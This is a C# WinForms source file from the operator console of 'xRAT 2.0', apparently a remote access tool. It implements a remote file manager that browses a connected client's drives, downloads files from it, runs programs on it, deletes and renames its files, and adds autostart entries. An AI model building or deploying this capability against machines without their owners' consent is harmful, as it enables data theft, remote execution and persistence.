using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Misc;
using xServer.Core.Packets.ServerPackets;
using Directory = xServer.Core.Packets.ServerPackets.Directory;

namespace xServer.Forms
{
    public partial class FrmFileManager : Form
    {
        private readonly Client _connectClient;
        private readonly ListViewColumnSorter _lvwColumnSorter;
        private string _currentDir;

        public FrmFileManager(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmFm = this;
            InitializeComponent();

            _lvwColumnSorter = new ListViewColumnSorter();
            lstDirectory.ListViewItemSorter = _lvwColumnSorter;
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]", _connectClient.EndPoint.Address,
                    _connectClient.EndPoint.Port);
                new Drives().Execute(_connectClient);
            }
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmFm = null;
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                if (_connectClient.Value != null)
                {
                    if (_connectClient.Value.LastDirectorySeen)
                    {
                        _currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
                        new Directory(_currentDir).Execute(_connectClient);
                        _connectClient.Value.LastDirectorySeen = false;
                    }
                }
            }
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                if (lstDirectory.SelectedItems.Count != 0)
                {
                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" &&
                        lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                    {
                        if (_connectClient.Value != null)
                        {
                            if (!_currentDir.EndsWith(@"\"))
                                _currentDir = _currentDir + @"\";

                            _currentDir = _currentDir.Remove(_currentDir.Length - 1);

                            if (_currentDir.Length > 2)
                                _currentDir = _currentDir.Remove(_currentDir.LastIndexOf(@"\"));

                            if (!_currentDir.EndsWith(@"\"))
                                _currentDir = _currentDir + @"\";

                            new Directory(_currentDir).Execute(_connectClient);
                            _connectClient.Value.LastDirectorySeen = false;
                        }
                    }
                    else if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir")
                    {
                        if (_connectClient.Value != null)
                        {
                            if (_connectClient.Value.LastDirectorySeen)
                            {
                                if (_currentDir.EndsWith(@"\"))
                                    _currentDir = _currentDir + lstDirectory.SelectedItems[0].SubItems[0].Text;
                                else
                                    _currentDir = _currentDir + @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;

                                new Directory(_currentDir).Execute(_connectClient);
                                _connectClient.Value.LastDirectorySeen = false;
                            }
                        }
                    }
                }
            }
        }

        private void ctxtDownload_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    var path = _currentDir;
                    if (path.EndsWith(@"\"))
                        path = path + files.SubItems[0].Text;
                    else
                        path = path + @"\" + files.SubItems[0].Text;

                    var ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index; // ;)

                    if (_connectClient != null)
                    {
                        new DownloadFile(path, ID).Execute(_connectClient);

                        Invoke((MethodInvoker) delegate
                        {
                            var lvi = new ListViewItem(new[] {ID.ToString(), "Downloading...", files.SubItems[0].Text});
                            lstTransfers.Items.Add(lvi);
                        });
                    }
                }
            }
        }

        private void ctxtExecute_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    var path = _currentDir;
                    if (path.EndsWith(@"\"))
                        path = path + files.SubItems[0].Text;
                    else
                        path = path + @"\" + files.SubItems[0].Text;

                    if (_connectClient != null)
                        new StartProcess(path).Execute(_connectClient);
                }
            }
        }

        private void ctxtRename_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.SubItems[0].Text != "..")
                {
                    var path = _currentDir;
                    var newName = files.SubItems[0].Text;
                    var isDir = files.Tag.ToString() == "dir";

                    if (path.EndsWith(@"\"))
                        path = path + files.SubItems[0].Text;
                    else
                        path = path + @"\" + files.SubItems[0].Text;

                    if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                    {
                        if (_currentDir.EndsWith(@"\"))
                            newName = _currentDir + newName;
                        else
                            newName = _currentDir + @"\" + newName;

                        if (_connectClient != null)
                            new Rename(path, newName, isDir).Execute(_connectClient);
                    }
                }
            }
        }

        private void ctxtDelete_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.SubItems[0].Text != "..")
                {
                    var path = _currentDir;
                    var isDir = files.Tag.ToString() == "dir";
                    var text = string.Format("Are you sure you want to delete this {0}",
                        (isDir) ? "directory?" : "file?");

                    if (path.EndsWith(@"\"))
                        path = path + files.SubItems[0].Text;
                    else
                        path = path + @"\" + files.SubItems[0].Text;

                    if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
                        DialogResult.Yes)
                    {
                        if (_connectClient != null)
                            new Delete(path, isDir).Execute(_connectClient);
                    }
                }
            }
        }

        private void ctxtAddToAutostart_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    var path = _currentDir;
                    if (path.EndsWith(@"\"))
                        path = path + files.SubItems[0].Text;
                    else
                        path = path + @"\" + files.SubItems[0].Text;

                    using (var frm = new FrmAddToAutostart(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            if (_connectClient != null)
                                new AddStartupItem(AutostartItem.Name, AutostartItem.Path, AutostartItem.Type).Execute(
                                    _connectClient);
                        }
                    }
                }
            }
        }

        private void ctxtRefresh_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                new Directory(_currentDir).Execute(_connectClient);
                _connectClient.Value.LastDirectorySeen = false;
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            var downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + _connectClient.EndPoint.Address);

            if (System.IO.Directory.Exists(downloadPath))
                Process.Start(downloadPath);
            else
                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
        }

        private void ctxtCancel_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[1].Text.StartsWith("Downloading")) return;
                if (_connectClient != null)
                    new DownloadFileCanceled(int.Parse(transfer.Text)).Execute(_connectClient);
            }
        }

        private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == _lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (_lvwColumnSorter.Order == SortOrder.Ascending)
                    _lvwColumnSorter.Order = SortOrder.Descending;
                else
                    _lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                _lvwColumnSorter.SortColumn = e.Column;
                _lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstDirectory.Sort();
        }
    }
}